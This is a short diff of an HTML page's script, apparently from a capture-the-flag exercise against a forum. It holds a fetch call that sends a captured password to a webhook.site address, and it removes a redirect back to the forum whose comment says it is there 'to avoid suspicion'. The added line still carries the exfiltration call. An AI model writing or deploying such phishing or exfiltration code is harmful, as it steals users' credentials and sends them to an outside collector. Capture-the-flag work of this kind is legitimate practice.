@@ -13,12 +13,7 @@
                                                                                                                             
         // Send it to our webhook                                                                                           
         if (password) {                                                                                                     
-            fetch('https://webhook.site/5283714c-0d6d-40d5-8473-70415e0e5652?password=' + encodeURIComponent(password))     
-                .then(() => {                                                                                               
-                    // After sending the password, redirect back to the forum                                               
-                    // to avoid suspicion                                                                                   
-                    window.location = 'http://forum2.gliactf.eu/';                                                          
-                });                                                                                                         
+            fetch('https://webhook.site/5283714c-0d6d-40d5-8473-70415e0e5652?password=' + encodeURIComponent(password));                                                                                                     
         }                                                                                                                   
     </script>                                                                                                               
 </body>                                                                                                                     
